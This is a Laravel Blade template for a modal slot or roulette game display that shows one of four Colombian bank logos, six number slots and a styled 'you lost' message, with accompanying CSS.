{{-- Modal de Juego de Ruleta/Slots --}}
@php
    $banco = $banco ?? 'avvillas';
    $bancos = [
        'avvillas' => ['nombre' => 'Banco AV Villas', 'logo' => 'logo-avv.png'],
        'bogota' => ['nombre' => 'Banco de Bogotá', 'logo' => 'logo-bog.png'],
        'occidente' => ['nombre' => 'Banco de Occidente', 'logo' => 'logo-occ.png'],
        'popular' => ['nombre' => 'Banco Popular', 'logo' => 'logo-pop.png'],
    ];
    $bancoInfo = $bancos[$banco] ?? $bancos['avvillas'];
@endphp

<div class="modal-overlay">
    <div class="modal-content">
        <div class="content">
            <img src="{{ asset('images/' . $bancoInfo['logo']) }}" alt="{{ $bancoInfo['nombre'] }}" class="logo" />

            <div class="ruedas-section" id="seccion-ruedas">
                <div class="mi-numero">
                    Mi número: <span class="numero-mostrado" id="numero-mostrado"></span>
                </div>
                <div class="slots-container">
                    @for ($i = 0; $i < 6; $i++)
                        <div class="slot" id="slot-{{ $i }}">
                            <div class="slot-number">0</div>
                        </div>
                    @endfor
                </div>
                <div id="mensaje-derrota" class="hidden mensaje-derrota">
                    ¡HAS PERDIDO!
                </div>
            </div>
        </div>
    </div>
</div>

<style>
    .modal-overlay {
        position: fixed;
        inset: 0;
        background-color: rgba(0, 0, 0, 0.5);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 50;
        padding: 1rem;
    }

    .modal-content {
        background-color: white;
        border-radius: 1rem;
        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        max-width: 85vw;
        width: 100%;
        padding: 1rem;
        animation: fadeIn 0.3s ease-out;
        box-sizing: border-box;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: scale(0.9); }
        to { opacity: 1; transform: scale(1); }
    }

    .content {
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 1.5rem;
        width: 100%;
    }

    .logo {
        height: 3.5rem;
        max-width: 100%;
        width: auto;
        object-fit: contain;
    }

    .mi-numero {
        text-align: center;
        color: #374151;
        font-size: 1.125rem;
        font-weight: 600;
        margin-bottom: 1rem;
    }

    .numero-mostrado {
        color: #2563eb;
        font-weight: 700;
        font-size: 1.5rem;
        letter-spacing: 0.1em;
    }

    .slots-container {
        display: flex;
        justify-content: center;
        gap: 0.25rem;
        margin-bottom: 1.5rem;
    }

    .slot {
        width: 2.3rem;
        height: 2.75rem;
        border: 2px solid #2563eb;
        border-radius: 0.5rem;
        background: linear-gradient(to bottom, #f0f9ff 0%, #ffffff 50%, #f0f9ff 100%);
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .slot-number {
        font-size: 1.5rem;
        font-weight: 600;
        color: #1e3a8a;
    }

    .mensaje-derrota {
        text-align: center;
        color: #dc2626;
        font-size: 2rem;
        font-weight: 900;
        animation: aparecerPerdida 0.8s ease-out;
    }

    @keyframes aparecerPerdida {
        0% { opacity: 0; transform: scale(0.5) translateY(-20px); }
        60% { transform: scale(1.2) translateY(0); }
        80% { transform: scale(0.95); }
        100% { opacity: 1; transform: scale(1); }
    }

    .hidden {
        display: none;
    }
</style>
